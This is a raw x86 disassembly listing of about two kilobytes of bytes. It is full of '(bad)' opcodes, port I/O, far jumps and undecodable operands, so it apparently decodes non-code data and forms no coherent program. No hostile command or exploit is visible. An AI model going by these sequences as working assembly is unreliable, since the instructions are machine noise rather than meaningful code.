  44632e:	adc    eax,0xd08274e8
  446333:	fcomp  DWORD PTR [edi]
  446335:	inc    ecx
  446336:	xchg   edx,eax
  446337:	push   ds
  446338:	std    
  446339:	das    
  44633a:	test   al,0xac
  44633c:	jle    0x446386
  44633e:	xor    cl,bl
  446340:	mov    ebx,0x18777ce0
  446345:	xchg   ebp,edx
  446347:	jne    0x44635a
  446349:	pop    ecx
  44634a:	lahf   
  44634b:	dec    ecx
  44634c:	imul   ebx,DWORD PTR [ebp+0x3bfe8b2b],0x22
  446353:	(bad)  
  446354:	imul   edx,DWORD PTR [eax-0x4f],0x4127d11d
  44635b:	in     al,0x5e
  44635d:	fstp   QWORD PTR [edi-0x6d]
  446360:	pop    esp
  446361:	cld    
  446362:	xlat   BYTE PTR ds:[ebx]
  446363:	mov    eax,ds:0x79f2c515
  446368:	aam    0xdc
  44636a:	mov    eax,0x77b0d6af
  44636f:	pusha  
  446370:	sbb    edx,esi
  446372:	fwait
  446373:	scas   eax,DWORD PTR es:[edi]
  446374:	popa   
  446375:	pop    ecx
  446376:	jo     0x4463db
  446378:	jo     0x446351
  44637a:	pop    ebx
  44637b:	test   al,0xa1
  44637d:	or     al,0x3c
  44637f:	pop    eax
  446380:	pusha  
  446381:	call   0xf56f6c3
  446386:	les    edx,FWORD PTR [esi-0x27]
  446389:	or     dl,BYTE PTR [ebx+edx*8-0x291f3493]
  446390:	scas   eax,DWORD PTR es:[edi]
  446391:	(bad)  
  446392:	into   
  446393:	inc    edx
  446394:	pop    esp
  446395:	nop
  446396:	sbb    al,0x42
  446398:	cdq    
  446399:	bnd jg 0x446410
  44639c:	cmp    cl,ch
  44639e:	mov    ds,WORD PTR [eax+0x71dfb40c]
  4463a4:	or     BYTE PTR [edx],al
  4463a6:	stos   DWORD PTR es:[edi],eax
  4463a7:	jmp    0x90b6:0xf6be8d5c
  4463ae:	(bad)  
  4463af:	push   esp
  4463b0:	shl    DWORD PTR ds:0x91822d6b,0xef
  4463b7:	fwait
  4463b8:	int    0xe6
  4463ba:	adc    bh,BYTE PTR [edx]
  4463bc:	stos   BYTE PTR es:[edi],al
  4463bd:	lods   al,BYTE PTR ds:[esi]
  4463be:	add    DWORD PTR [ecx-0xc],ebp
  4463c1:	ror    ecx,1
  4463c3:	push   ecx
  4463c4:	push   ss
  4463c5:	jg     0x446412
  4463c7:	retf   0xdefb
  4463ca:	sbb    ah,BYTE PTR [ebx]
  4463cc:	cwde   
  4463cd:	xchg   edi,eax
  4463ce:	xchg   ecx,eax
  4463cf:	and    al,0xb9
  4463d1:	inc    esi
  4463d2:	add    eax,0xeef8706b
  4463d7:	retf   
  4463d8:	in     eax,dx
  4463d9:	call   FWORD PTR [eax+0x64]
  4463dc:	adc    eax,0x52b9baf9
  4463e1:	mov    ah,0xb1
  4463e3:	out    0x61,eax
  4463e5:	mov    dh,0x67
  4463e7:	aas    
  4463e8:	lds    esp,FWORD PTR [esi+0x41290920]
  4463ee:	or     eax,0x36f2dd5
  4463f3:	mov    DWORD PTR [ecx],edx
  4463f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4463f6:	test   ecx,edx
  4463f8:	add    ch,dh
  4463fa:	or     eax,0x4043203a
  4463ff:	cmc    
  446400:	sbb    ebx,ecx
  446402:	in     eax,dx
  446403:	inc    ebp
  446404:	push   edx
  446405:	mov    al,cl
  446407:	mov    edi,0x2c99081f
  44640c:	hlt    
  44640d:	adc    bl,BYTE PTR [ebx+0x322838db]
  446413:	lahf   
  446414:	inc    ebx
  446415:	aaa    
  446416:	sub    BYTE PTR gs:[eax-0x1c],ah
  44641a:	sub    ebx,ebx
  44641c:	jmp    0xbf82:0x8876a852
  446423:	jmp    0x6a4424ba
  446428:	push   ebx
  446429:	mov    ds:0xc0dad1ea,eax
  44642e:	leave  
  44642f:	cs in  eax,0x73
  446432:	mov    dh,0x23
  446434:	rcr    BYTE PTR [ebp-0x6],1
  446437:	fistp  QWORD PTR [esi+0x2a]
  44643a:	pop    edi
  44643b:	(bad)  
  44643c:	jnp    0x44644e
  44643e:	rcl    BYTE PTR [edx],0xc1
  446441:	sub    dh,al
  446443:	scas   eax,DWORD PTR es:[edi]
  446444:	in     al,dx
  446445:	fcom   DWORD PTR [eax]
  446447:	xchg   esp,eax
  446448:	sub    al,0xbc
  44644a:	dec    esp
  44644b:	ds test eax,0x863c550d
  446451:	and    eax,0xd65ac996
  446456:	pop    ecx
  446457:	fiadd  DWORD PTR [esi+esi*1+0x29]
  44645b:	(bad)  
  44645c:	or     eax,0x1b6d90fd
  446461:	(bad)  
  446462:	fidiv  WORD PTR [esi+0x3d070ea5]
  446468:	push   ecx
  446469:	lea    esp,[edi-0x33]
  44646c:	mov    ds:0x9226a0e4,eax
  446471:	push   ebx
  446472:	sbb    al,0xb1
  446474:	adc    BYTE PTR [ebx],bl
  446476:	inc    edx
  446477:	pop    ebp
  446478:	lock ins DWORD PTR es:[edi],dx
  44647a:	mov    al,0xc1
  44647c:	test   eax,0x614ca05
  446481:	or     esp,edx
  446483:	ins    DWORD PTR es:[edi],dx
  446484:	push   ds
  446485:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446486:	push   0x63bc365b
  44648b:	ficom  DWORD PTR [eax+0x12]
  44648e:	test   BYTE PTR [edi+eax*8+0x33],ch
  446492:	add    eax,0xd700862
  446497:	ror    BYTE PTR [ecx+0x54],1
  44649a:	(bad)  
  44649b:	loope  0x446445
  44649d:	xchg   edx,eax
  44649e:	inc    eax
  44649f:	inc    ebx
  4464a0:	ins    DWORD PTR es:[edi],dx
  4464a1:	in     eax,0x80
  4464a3:	loop   0x44646f
  4464a5:	outs   dx,DWORD PTR ds:[esi]
  4464a6:	dec    DWORD PTR [edi]
  4464a8:	adc    bh,BYTE PTR [eax+0x5665b5cb]
  4464ae:	or     edi,edx
  4464b0:	xchg   BYTE PTR [ebx+0x688fd656],ah
  4464b6:	nop
  4464b7:	pusha  
  4464b8:	fld    DWORD PTR [ebx]
  4464ba:	adc    eax,0xed8f7425
  4464bf:	xchg   ecx,eax
  4464c0:	cli    
  4464c1:	cmc    
  4464c2:	fild   DWORD PTR [ebx]
  4464c4:	add    BYTE PTR [ebx],bh
  4464c6:	and    dl,BYTE PTR [eax-0x38def581]
  4464cc:	lahf   
  4464cd:	and    al,0xa4
  4464cf:	jno    0x7f7b8d4
  4464d5:	adc    DWORD PTR [ebx],eax
  4464d7:	in     eax,dx
  4464d8:	adc    al,0x3
  4464da:	mov    ch,0xf4
  4464dc:	vshufps xmm3,xmm5,XMMWORD PTR [ecx+0x56],0x80
  4464e2:	ja     0x4464fd
  4464e4:	or     dh,BYTE PTR [ecx-0xa2fb154]
  4464ea:	mov    ah,0xe4
  4464ec:	cmp    al,0x57
  4464ee:	sbb    edx,0xc67891ff
  4464f4:	bound  ecx,QWORD PTR [eax+esi*4]
  4464f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4464f8:	adc    DWORD PTR ds:0x213ae7d5,ebx
  4464fe:	push   eax
  4464ff:	cmp    bl,BYTE PTR ss:[ebx+eiz*1-0x3e0fc119]
  446507:	fdiv   QWORD PTR [esi]
  446509:	repnz or BYTE PTR [edx+0x6d995f34],dl
  446510:	arpl   WORD PTR [esi-0x2eff31df],sp
  446516:	hlt    
  446517:	ins    DWORD PTR es:[edi],dx
  446518:	push   0x30
  44651a:	in     al,0x6c
  44651c:	xchg   ebx,eax
  44651d:	stc    
  44651e:	cdq    
  44651f:	push   0xffffffc7
  446521:	loopne 0x4464be
  446523:	pop    edx
  446524:	loope  0x44652b
  446526:	pop    esi
  446527:	mov    eax,edi
  446529:	dec    edx
  44652a:	retf   0x9b70
  44652d:	jmp    0x16d1:0x9942499d
  446534:	mov    edi,0x1befa5e8
  446539:	rol    BYTE PTR [edi-0x4dfe929b],0x1e
  446540:	inc    edx
  446541:	fcomp  st(5)
  446543:	xchg   ebx,eax
  446544:	hlt    
  446545:	bound  esp,QWORD PTR [eax-0x5e807162]
  44654b:	ins    DWORD PTR es:[edi],dx
  44654c:	cli    
  44654d:	fidiv  DWORD PTR [eax+0x37b0d598]
  446553:	sbb    eax,0x42670a44
  446558:	and    cl,BYTE PTR [eax+0x78ff574d]
  44655e:	sti    
  44655f:	hlt    
  446560:	or     dh,BYTE PTR [eax-0x55e0d481]
  446566:	out    dx,eax
  446567:	loop   0x446561
  446569:	sub    eax,0xcf286b0c
  44656e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44656f:	push   esi
  446570:	mov    eax,ds:0x8d2b766
  446575:	arpl   WORD PTR [ebx],di
  446577:	fimul  WORD PTR [ebp-0x72a4e59]
  44657d:	pop    edi
  44657e:	inc    edx
  44657f:	in     al,0x70
  446581:	clc    
  446582:	mov    BYTE PTR [esi+0x50],dh
  446585:	or     eax,0x23c2ebd6
  44658a:	pop    esi
  44658b:	sbb    ebp,esp
  44658d:	push   ds
  44658e:	xchg   BYTE PTR [ebp+0x326dcfa3],cl
  446594:	dec    edi
  446595:	fstp   DWORD PTR [edx+0x6a7f0723]
  44659b:	adc    BYTE PTR [ecx-0x2ade9ec],dl
  4465a1:	jnp    0x446587
  4465a3:	repnz adc esp,DWORD PTR [ebx+eax*4-0x58fbe016]
  4465ab:	push   eax
  4465ac:	adc    ebp,DWORD PTR ds:0x9def4cb8
  4465b2:	mov    ebx,DWORD PTR ss:[edx-0x44]
  4465b6:	(bad)  
  4465b7:	mov    bl,0xee
  4465b9:	jnp    0x446628
  4465bb:	push   ds
  4465bc:	push   edi
  4465bd:	stos   BYTE PTR es:[edi],al
  4465be:	ja     0x446560
  4465c0:	cmp    BYTE PTR [edi],0x1d
  4465c3:	out    0xa5,eax
  4465c5:	cmp    al,0xf5
  4465c7:	adc    BYTE PTR [esi+0x5a],0x2e
  4465cb:	inc    edx
  4465cc:	mov    al,0x7e
  4465ce:	je     0x44656d
  4465d0:	repnz das 
  4465d2:	xor    BYTE PTR [edi],0x2b
  4465d5:	stos   BYTE PTR es:[edi],al
  4465d6:	sar    BYTE PTR [edx+0x31],1
  4465d9:	cmc    
  4465da:	mov    ecx,0x4ca678a8
  4465df:	xchg   BYTE PTR [ebx],dh
  4465e1:	pop    ebx
  4465e2:	inc    esp
  4465e3:	cmp    BYTE PTR [edx],dh
  4465e5:	push   ebx
  4465e6:	sub    bl,ah
  4465e8:	mov    bl,0xa9
  4465ea:	cmp    eax,0x767cdb54
  4465ef:	je     0x446656
  4465f1:	psubusw mm0,QWORD PTR [ebx]
  4465f4:	out    dx,al
  4465f5:	cld    
  4465f6:	es cmc 
  4465f8:	or     DWORD PTR [ebp-0x100f91db],ebx
  4465fe:	xor    edi,edi
  446600:	stos   BYTE PTR es:[edi],al
  446601:	test   eax,0x9f937761
  446606:	js     0x446591
  446608:	inc    edx
  446609:	xchg   edi,eax
  44660a:	xchg   ebx,eax
  44660b:	sub    DWORD PTR [ebp-0x18],0xd4ab4554
  446612:	inc    edx
  446613:	or     DWORD PTR [edx+0x18e563da],esp
  446619:	lods   eax,DWORD PTR cs:[esi]
  44661b:	or     al,BYTE PTR [ecx-0x5a]
  44661e:	sti    
  44661f:	xchg   DWORD PTR [ebx-0xbb4d376],ecx
  446625:	or     edi,edx
  446627:	sub    DWORD PTR [ebp-0x4c188045],esp
  44662d:	int3   
  44662e:	xchg   edx,eax
  44662f:	fisubr DWORD PTR [eiz*1+0x7ddbb1ec]
  446636:	xor    eax,0xcdf606d4
  44663b:	add    ah,bl
  44663d:	sbb    al,0x50
  44663f:	push   ebx
  446640:	jbe    0x4466a2
  446642:	cmp    dh,BYTE PTR [esi]
  446644:	stc    
  446645:	add    BYTE PTR [edi+0x1c51dfc6],ah
  44664b:	push   esi
  44664c:	jno    0x44668d
  44664e:	sar    DWORD PTR [ebx],1
  446650:	out    0xbe,eax
  446652:	mul    BYTE PTR [esi-0x6bbfb09]
  446658:	mov    edx,0xbf155fdf
  44665d:	cmp    al,0x93
  44665f:	jp     0x4465f5
  446661:	jno    0x446634
  446663:	fdivr  DWORD PTR [edi+edi*2-0x7e5887d9]
  44666a:	push   0xffffffed
  44666c:	push   ebx
  44666d:	call   0xa6982349
  446672:	retf   
  446673:	scas   al,BYTE PTR es:[edi]
  446674:	pop    eax
  446675:	int3   
  446676:	push   ebp
  446677:	scas   al,BYTE PTR es:[edi]
  446678:	in     al,dx
  446679:	das    
  44667a:	add    eax,0x6a9744a6
  44667f:	repz xor ecx,DWORD PTR [esi]
  446682:	add    ch,BYTE PTR [eax+0x69]
  446685:	push   0xfffffff5
  446687:	xchg   edi,eax
  446688:	sub    bh,ch
  44668a:	sub    al,0xf8
  44668c:	fbstp  TBYTE PTR [ebx]
  44668e:	cmp    ebx,esi
  446690:	cli    
  446691:	sbb    BYTE PTR [edi+0x1db5fcec],0xe2
  446698:	dec    ax
  44669a:	pop    esi
  44669b:	push   0xb6826f23
  4466a0:	rcl    DWORD PTR [ebp+esi*4+0xa],0x14
  4466a5:	and    BYTE PTR [ebx-0x20],0xe9
  4466a9:	fistp  QWORD PTR [ebp+0x72]
  4466ac:	int3   
  4466ad:	gs sub eax,0x167b04ed
  4466b3:	hlt    
  4466b4:	cmp    al,0x9c
  4466b6:	add    dh,BYTE PTR [eax+0x48]
  4466b9:	add    cl,cl
  4466bb:	add    DWORD PTR [ebx+ecx*2],edx
  4466be:	mov    BYTE PTR [edi],cl
  4466c0:	cwde   
  4466c1:	mov    DWORD PTR [ebp+0x49],edi
  4466c4:	sbb    al,0xb3
  4466c6:	add    eax,0x731780fe
  4466cb:	fs in  al,dx
  4466cd:	out    0xcb,al
  4466cf:	mov    BYTE PTR [ecx+0xcbdec9e],dl
  4466d5:	mov    eax,ds:0xda9ed7f8
  4466da:	test   eax,0x5ec7f6a6
  4466df:	int    0x6f
  4466e1:	mov    eax,0x171e4669
  4466e6:	pop    ecx
  4466e7:	pop    ds
  4466e8:	and    eax,DWORD PTR [edi+0x76b8710c]
  4466ee:	out    dx,al
  4466ef:	sub    cl,bl
  4466f1:	and    al,0x76
  4466f3:	inc    esp
  4466f4:	xor    ecx,ebx
  4466f6:	gs xchg ecx,eax
  4466f8:	mov    bh,0xee
  4466fa:	mov    BYTE PTR [ecx+0x4a4528c4],0x76
  446701:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446702:	ffreep st(0)
  446704:	sbb    al,0xb8
  446706:	ret    0xcfaa
  446709:	or     edx,DWORD PTR [eax-0x3f]
  44670c:	cmp    eax,0xfff0e48d
  446711:	mov    ebx,0xb9818fed
  446716:	cld    
  446717:	xchg   ecx,eax
  446718:	cmp    edi,0x5b1a5da9
  44671e:	mov    ecx,0xdb700d79
  446723:	mov    BYTE PTR [esp+edx*8+0x6],bh
  446727:	mov    esp,DWORD PTR [ecx]
  446729:	mov    ds:0xaf271836,al
  44672e:	(bad)  
  44672f:	mov    DWORD PTR [eax],esi
  446731:	rcl    DWORD PTR [edi-0x27],0x1f
  446735:	pop    ds
  446736:	shl    DWORD PTR [ebp-0x6b128ba7],0x39
  44673d:	mov    eax,0xc510689d
  446742:	es cmc 
  446744:	mov    edx,0x745e6ee6
  446749:	dec    ecx
  44674a:	imul   ebp,DWORD PTR [eax+edi*4+0x8a0e031],0x1ad5a0ed
  446755:	inc    edx
  446756:	adc    dl,0x10
  446759:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44675a:	fdivrp st(1),st
  44675c:	gs mov dl,ah
  44675f:	jge    0x4466f4
  446761:	stos   BYTE PTR es:[edi],al
  446762:	mov    ebx,DWORD PTR [ebp+0x5d383d80]
  446768:	add    DWORD PTR [eax+0x3f],ecx
  44676b:	mov    dl,0x75
  44676d:	xchg   BYTE PTR [esi-0x35],dl
  446770:	mov    esp,0xd5c2f866
  446775:	sbb    ebp,DWORD PTR [edi]
  446777:	mov    ds:0xcfd58b2a,eax
  44677c:	sbb    BYTE PTR [eax-0x46],ch
  44677f:	mov    esp,0x91986fab
  446784:	cmc    
  446785:	arpl   WORD PTR [ebx+0x85dff1c],di
  44678b:	pusha  
  44678c:	dec    esi
  44678d:	jne    0x4467dc
  44678f:	jg     0x4467a9
  446791:	xor    BYTE PTR [edx-0xe96376c],ah
  446797:	inc    edi
  446798:	or     eax,0xda048e33
  44679d:	inc    ebp
  44679e:	push   ds
  44679f:	in     al,dx
  4467a0:	jne    0x446744
  4467a2:	mov    ss,WORD PTR [ebx-0x2f37967c]
  4467a8:	xor    eax,0x22714874
  4467ad:	cmp    DWORD PTR [edi],ebx
  4467af:	out    0x11,eax
  4467b1:	jg     0x446742
  4467b3:	xchg   edx,eax
  4467b4:	inc    esp
  4467b5:	enter  0xbd4a,0x56
  4467b9:	add    BYTE PTR [ebp+0x10],al
  4467bc:	pop    es
  4467bd:	lea    ebp,[eax+0x10]
  4467c0:	push   esi
  4467c1:	adc    ebp,DWORD PTR [edx]
  4467c3:	xchg   edx,eax
  4467c4:	les    edx,FWORD PTR [edx+eax*4+0x20]
  4467c8:	jmp    0x728c:0xda7349b5
  4467cf:	mov    DWORD PTR [ebx-0x34],edi
  4467d2:	imul   BYTE PTR [edx-0x12]
  4467d5:	inc    edi
  4467d6:	jno    0x4467a5
  4467d8:	push   edi
  4467d9:	add    al,0xfa
  4467db:	xor    al,0x64
  4467dd:	mov    eax,0x2564c9c4
  4467e2:	inc    esi
  4467e3:	xchg   ebp,eax
  4467e4:	or     BYTE PTR [eax+0x7fcf5114],dl
  4467ea:	test   DWORD PTR [ecx],0xacf24a22
  4467f0:	fcomp  DWORD PTR [ebx+0x3f7bb27c]
  4467f6:	adc    esi,ebp
  4467f8:	scas   al,BYTE PTR es:[edi]
  4467f9:	cmp    BYTE PTR cs:[ecx+0x755c5edf],ch
  446800:	scas   eax,DWORD PTR es:[edi]
  446801:	inc    esp
  446802:	mov    edi,0x90889562
  446807:	jge    0x446857
  446809:	mov    ebx,0xf0c21ccf
  44680e:	sbb    DWORD PTR [ebx-0x5c624061],edx
  446814:	sbb    al,0xcb
  446816:	inc    esi
  446817:	sub    al,0x64
  446819:	push   ss
  44681a:	pop    esi
  44681b:	jmp    0x446853
  44681d:	mov    WORD PTR [ebx-0x37],ds
  446820:	leave  
  446821:	mov    cl,BYTE PTR [ecx]
  446823:	adc    eax,0x6bbfe86e
  446828:	loop   0x446871
  44682a:	lods   al,BYTE PTR ds:[esi]
  44682b:	loop   0x4467f5
  44682d:	ss stc 
  44682f:	(bad)  
  446830:	jnp    0x446833
  446832:	sub    DWORD PTR [ebx-0x46],ecx
  446835:	(bad)  
  446836:	clc    
  446837:	pop    eax
  446838:	mov    ecx,0xa75d2218
  44683d:	xor    al,0x8
  44683f:	inc    edi
  446840:	adc    al,0xf
  446842:	push   ebx
  446843:	xchg   esp,esi
  446845:	les    edi,FWORD PTR [ebx+0x33233942]
  44684b:	icebp  
  44684c:	enter  0x8243,0x81
  446850:	ror    BYTE PTR [edx],0xa3
  446853:	fcomp  DWORD PTR [ebx-0x21]
  446856:	adc    DWORD PTR [eax+0x39a2cf8d],esi
  44685c:	inc    esi
  44685d:	in     al,dx
  44685e:	ret    0xc7f0
  446861:	retf   
  446862:	jb     0x4468b0
  446864:	sub    al,0x92
  446866:	jmp    0x641d:0xc388ad6d
  44686d:	cwde   
  44686e:	or     ecx,ebp
  446870:	mov    ebx,0xabe4303a
  446875:	mov    esi,0xbf8b7ed4
  44687a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44687b:	ret    0x33fb
  44687e:	xor    ecx,edi
  446880:	jns    0x446831
  446882:	adc    BYTE PTR [edx+0x60d7ac6],dl
  446888:	mov    ecx,0xcd101f39
  44688d:	xor    BYTE PTR [ecx+0x77],0xd6
  446891:	dec    ebx
  446892:	or     al,0xe7
  446894:	fbld   TBYTE PTR [edx+0x3e]
  446897:	cs mov esp,0xbfd0468
  44689d:	add    eax,DWORD PTR [ebx-0x4a]
  4468a0:	in     al,dx
  4468a1:	push   edx
  4468a2:	ds int 0x24
  4468a5:	adc    ah,cl
  4468a7:	or     edx,DWORD PTR [ebx-0x1d]
  4468aa:	mov    ah,0x4c
  4468ac:	pop    ecx
  4468ad:	inc    edx
  4468ae:	xor    BYTE PTR ds:0x44401b12,bh
  4468b4:	mov    ecx,0x862b2a66
  4468b9:	shr    DWORD PTR [esi+0x50],1
  4468bc:	push   0xffffffe0
  4468be:	cwde   
  4468bf:	test   BYTE PTR [edi-0x58],0x47
  4468c3:	add    BYTE PTR [ebx*1-0x5b691b3e],cl
  4468ca:	(bad)  
  4468cb:	and    eax,DWORD PTR [esi-0x7f]
  4468ce:	push   es
  4468cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4468d0:	sub    al,0xf8
  4468d2:	shr    DWORD PTR [esi+0x13f03ef8],cl
  4468d8:	call   0x50120559
  4468dd:	adc    DWORD PTR [edx],esp
  4468df:	add    bl,BYTE PTR [eax-0x58]
  4468e2:	push   es
  4468e3:	jmp    0x3ff32bee
  4468e8:	mov    DWORD PTR [edx],ecx
  4468ea:	xchg   ebx,eax
  4468eb:	stc    
  4468ec:	or     BYTE PTR [edi+0x30],al
  4468ef:	cmp    al,0x30
  4468f1:	mov    ds:0x8b408528,eax
  4468f6:	lock dec edi
  4468f8:	mov    esp,0x94306a30
  4468fd:	jmp    0x446954
  4468ff:	jmp    0x1198:0x18355de8
  446906:	jnp    0x4468df
  446908:	mov    ebp,0x6331796c
  44690d:	leave  
  44690e:	pop    esp
  44690f:	(bad)  
  446911:	mov    cl,0x3d
  446913:	test   eax,0x9e2da282
  446918:	loope  0x44696b
  44691a:	xchg   ebp,eax
  44691b:	jae    0x44698f
  44691d:	and    DWORD PTR [edx],esi
  44691f:	(bad)  
  446920:	sub    edx,esi
  446922:	lea    eax,[ecx]
  446924:	mov    al,0xad
  446926:	inc    ebp
  446927:	dec    eax
  446928:	iret   
  446929:	sub    BYTE PTR [esi+0x33],dh
  44692c:	jns    0x446997
  44692e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44692f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446930:	inc    ebx
  446931:	loope  0x446926
  446933:	jnp    0x446984
  446935:	(bad)  
  446936:	(bad)  
  446937:	and    BYTE PTR [edx+0x7c2d7144],dh
  44693d:	cmc    
  44693e:	fild   WORD PTR [edi]
  446940:	cmp    BYTE PTR [ebp+0x7e],ch
  446943:	int3   
  446944:	mov    WORD PTR [edi+esi*4-0x68],?
  446948:	test   DWORD PTR [edx-0x4786f625],ebx
  44694e:	mov    WORD PTR [edi],?
  446950:	xlat   BYTE PTR ds:[ebx]
  446951:	and    esi,DWORD PTR [ebx-0x49]
  446954:	pop    ebx
  446955:	das    
  446956:	mov    WORD PTR [esp+ebx*2],?
  446959:	ins    DWORD PTR es:[edi],dx
  44695a:	shr    DWORD PTR gs:[edx-0x2c],0x33
  44695f:	jmp    0x4468f7
  446961:	lea    eax,[esi-0x8]
  446964:	stos   DWORD PTR es:[edi],eax
  446965:	inc    ebx
  446966:	push   ecx
  446967:	nop
  446968:	lods   al,BYTE PTR ds:[esi]
  446969:	daa    
  44696a:	stc    
  44696b:	retf   
  44696c:	mov    al,ds:0x33245a59
  446971:	adc    edi,esi
  446973:	dec    edi
  446974:	iret   
  446975:	not    DWORD PTR [eax]
  446977:	xchg   edi,eax
  446978:	repz sbb eax,0xcf10871b
  44697e:	repz cmps BYTE PTR ds:[si],BYTE PTR es:[di]
  446981:	lods   al,BYTE PTR ds:[esi]
  446982:	nop
  446983:	daa    
  446984:	clc    
  446985:	or     esi,DWORD PTR [edx]
  446987:	mov    cl,0x34
  446989:	fst    DWORD PTR [edx-0x50]
  44698c:	pop    ebp
  44698d:	mov    ah,0x47
  44698f:	mov    BYTE PTR [ecx+0x68],ch
  446992:	pop    esp
  446993:	addr16 or eax,0xbecae8a3
  446999:	jl     0x4469a0
  44699b:	adc    al,0xf2
  44699d:	loope  0x4469e3
  44699f:	dec    ebx
  4469a0:	push   eax
  4469a1:	pop    ss
  4469a2:	pop    es
  4469a3:	xchg   esp,eax
  4469a4:	paddd  mm0,QWORD PTR [eax+0x32]
  4469a8:	cmc    
  4469a9:	or     BYTE PTR [esi-0x55761664],al
  4469af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4469b0:	icebp  
  4469b1:	and    ah,cl
  4469b3:	jmp    0xfb95f658
  4469b8:	test   BYTE PTR [edi-0x3b],ch
  4469bb:	dec    esp
  4469bc:	(bad)  
  4469bd:	push   ebx
  4469be:	xchg   DWORD PTR [eax],edi
  4469c0:	push   es
  4469c1:	imul   edx
  4469c3:	and    dl,BYTE PTR [esi]
  4469c5:	mov    eax,0x9b4ab68f
  4469ca:	adc    BYTE PTR [eax+0x7a],dl
  4469cd:	cmp    al,0xe6
  4469cf:	mov    bh,0x20
  4469d1:	and    DWORD PTR [ebx],esp
  4469d3:	lds    ebp,FWORD PTR [edx]
  4469d5:	ds adc al,0xe4
  4469d8:	pop    ss
  4469d9:	je     0x4469b3
  4469db:	cmp    BYTE PTR [ebx+0x7a],0x72
  4469df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4469e0:	jg     0x4469e2
  4469e2:	aaa    
  4469e3:	loop   0x4469dd
  4469e5:	fs into 
  4469e7:	push   ss
  4469e8:	dec    edx
  4469e9:	stos   DWORD PTR es:[edi],eax
  4469ea:	mov    ecx,0x81660799
  4469ef:	mov    ebx,0xa67b064d
  4469f4:	sub    eax,DWORD PTR [ecx]
  4469f6:	pushf  
  4469f7:	retf   
  4469f8:	mov    ds:0x9835d461,al
  4469fd:	mov    ebx,0xe14fd5b9
  446a02:	cld    
  446a03:	aaa    
  446a04:	aam    0x48
  446a06:	mov    eax,0x60ea56d6
  446a0b:	jo     0x446a02
  446a0d:	jp     0x446a40
  446a0f:	sbb    bh,BYTE PTR [edx]
  446a11:	adc    eax,DWORD PTR ds:0xe94d9f26
  446a17:	shr    DWORD PTR [edx-0x2ae6a83e],1
  446a1d:	jne    0x4469f9
  446a1f:	push   0x51
  446a21:	out    0x8e,al
  446a23:	cdq    
  446a24:	xor    eax,0x8af2dcb6
  446a29:	inc    esp
  446a2a:	repz sbb al,0x57
  446a2d:	adc    DWORD PTR [edx-0x3ec5be9b],eax
  446a33:	lahf   
  446a34:	test   BYTE PTR [edi],bh
  446a36:	or     dl,bh
  446a38:	push   0xa343e39d
  446a3d:	shl    DWORD PTR [esi+edx*8-0x3d],0x4
  446a42:	jnp    0x4469c4
  446a44:	inc    ebx
  446a45:	lea    ebx,[edx-0x2e]
  446a48:	fsub   st,st(4)
  446a4a:	dec    ebp
  446a4b:	inc    edi
  446a4c:	xchg   edi,eax
  446a4d:	cli    
  446a4e:	ss xchg edx,eax
  446a50:	stc    
  446a51:	jbe    0x446a38
  446a53:	cli    
  446a54:	cmp    BYTE PTR [edx-0x37],ch
  446a57:	lahf   
  446a58:	(bad)  
  446a59:	repnz pop esi
  446a5b:	enter  0x1208,0x15
  446a5f:	and    eax,0xf6001e45
  446a64:	in     eax,dx
  446a65:	ret    0x57f6
  446a68:	mov    DWORD PTR [edi+ecx*1+0x1a],ecx
  446a6c:	(bad)  
  446a6d:	push   ebx
  446a6e:	int    0xdd
  446a70:	pop    esi
  446a71:	loopne 0x446a7c
  446a73:	xlat   BYTE PTR ds:[ebx]
  446a74:	frstor [ebx+0x4de56d47]
  446a7a:	fist   DWORD PTR ds:0x9767a0ee
  446a80:	inc    edx
  446a81:	test   BYTE PTR [ebp-0x6415082f],bl
  446a87:	cmp    ecx,eax
  446a89:	(bad)  
  446a8a:	(bad)  
  446a8b:	sub    eax,0xcc067c49
  446a90:	out    0x50,al
  446a92:	jo     0x446aa9
  446a94:	adc    eax,0x3802daab
  446a9a:	ret    
  446a9b:	mov    edi,0xd6b679a6
  446aa0:	loop   0x446af9
  446aa2:	pusha  
  446aa3:	dec    edx
  446aa4:	push   cs
  446aa5:	or     eax,0x2846c798
  446aaa:	mov    edi,DWORD PTR [edx-0x4640b026]
  446ab0:	dec    ebx
  446ab1:	call   0x1534:0x918b5a1
  446ab8:	lock ror BYTE PTR [esi+0x6f2d7bd],0x38
  446ac0:	ins    DWORD PTR es:[edi],dx
  446ac1:	test   al,0x99
  446ac3:	call   0x4d22:0x49e95c18
  446aca:	repnz xchg edi,eax
  446acc:	push   ds
  446acd:	add    eax,DWORD PTR [ebx+0x70]
  446ad0:	sahf   
  446ad1:	add    bl,BYTE PTR ds:0xf2593b71
  446ad7:	and    ebp,esi
  446ad9:	cld    
  446ada:	enter  0x9557,0x7c
  446ade:	inc    eax
  446adf:	mov    ch,0x39
  446ae1:	pop    ecx
  446ae2:	sbb    bh,bl
  446ae4:	cmp    eax,0x9b5fb2dc
  446ae9:	mov    ds:0x8f5af9d8,eax
  446aee:	dec    eax
  446aef:	pop    edx
  446af0:	mov    al,ds:0xf4c59f66
  446af5:	jp     0x446b0a
  446af7:	push   eax
  446af8:	mov    cl,BYTE PTR [esi-0x9]
  446afb:	idiv   BYTE PTR [edi]
  446afd:	in     eax,dx
  446afe:	inc    esp
  446aff:	stos   BYTE PTR es:[edi],al
  446b00:	pushf  
  446b01:	pop    edx
  446b02:	xchg   ebx,eax
  446b03:	cmp    bl,al
  446b05:	dec    ebp
  446b06:	stos   BYTE PTR es:[edi],al
  446b07:	(bad)  
  446b08:	popa   
  446b09:	aam    0x8f
  446b0b:	xchg   ebx,eax
  446b0c:	in     eax,0xb7
  446b0e:	mov    ebp,0xd53af107
  446b13:	fisubr DWORD PTR [bp-0xc65]
  446b18:	mov    esp,0xf1123a4f
  446b1d:	mov    ch,0xba
  446b1f:	dec    eax
